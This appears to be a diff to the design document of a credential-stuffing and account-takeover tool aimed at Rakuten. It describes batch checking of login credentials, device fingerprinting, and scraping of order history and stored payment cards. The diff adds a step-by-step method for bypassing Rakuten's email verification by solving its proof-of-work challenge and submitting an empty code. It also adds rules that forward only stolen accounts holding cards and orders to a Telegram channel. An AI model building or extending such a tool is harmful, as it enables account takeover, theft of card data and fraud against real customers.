@@ -69,7 +69,7 @@
 │    ├─ htmlCapture.js           → HTML fallback scraping              │
 │    ├─ orderHistory.js          → Order data via SSO                  │
 │    ├─ profileData.js           → Profile & cards via SSO             │
-│    └─ ssoFormHandler.js        → Shared SSO form parser              │
+│    └─ ssoFormHandler.js        → SSO form parser + verification skip │
 ├─────────────────────────────────────────────────────────────────────┤
 │                      FINGERPRINTING LAYER                            │
 ├─────────────────────────────────────────────────────────────────────┤
@@ -112,7 +112,7 @@
 | `telegram/batchHandlers.js` | Regular batch processing | `registerBatchHandlers()`, `abortActiveBatch()`, `hasActiveBatch()`, `getAllActiveBatches()` |
 | `telegram/combineHandler.js` | Combine mode session | `registerCombineHandlers()`, `hasSession()`, `clearSession()` |
 | `telegram/combineBatchRunner.js` | Combine batch execution | `runCombineBatch()`, `abortCombineBatch()`, `hasCombineBatch()`, `getActiveCombineBatch()` |
-| `telegram/channelForwarder.js` | Forward VALID to channel | `forwardValidToChannel()`, `isForwardingEnabled()` |
+| `telegram/channelForwarder.js` | Forward VALID to channel (requires order + cards) | `forwardValidToChannel()`, `isForwardingEnabled()`, `validateCaptureForForwarding()` |
 | `telegram/channelForwardStore.js` | Channel forward deduplication | `hasBeenForwarded()`, `markForwarded()`, `initForwardStore()` |
 
 ### HTTP Layer
@@ -319,6 +319,17 @@ Rakuten uses a client-side POW challenge (`cres`):
    - Loop until hash starts with `mask`
    - Return the string as `cres`
 
+### Email Verification Skip
+
+When profile capture hits `/verification/email`, auto-skip is triggered:
+1. Extract main token from URL
+2. Call `/util/gc` with `page_type: 'LOGIN_START'` to get challenge token + mdata
+3. Compute POW `cres` from mdata using worker pool
+4. POST to `/v2/verify/email` with `code: ''` (empty = skip)
+5. Retry SSO authorize → verification bypassed
+
+Implementation: `ssoFormHandler.js` → `skipEmailVerification(client, verificationUrl, timeoutMs)`
+
 ### Outcome Detection
 
 | HTTP Status | Response Content | Outcome |
@@ -385,6 +396,17 @@ TTL: 7 days (configurable via `PROCESSED_TTL_MS`)
 - TTL: 30 days (configurable via `FORWARD_TTL_MS`)
 - Reuses same Redis client as `processedStore` when available
 - Falls back to JSONL file: `data/processed/forwarded-creds.jsonl`
+
+### Channel Forwarding Requirements
+
+`channelForwarder.js` only forwards credentials that meet quality criteria:
+
+| Requirement | Check | Reason |
+|-------------|-------|--------|
+| Latest Order | `latestOrder !== 'n/a'` | Account has purchase history |
+| Card Data | `profile.cards.length > 0` | Skip logic worked, cards captured |
+
+Use `validateCaptureForForwarding(capture)` to check: returns `{ valid: boolean, reason: string }`
 
 ---
 
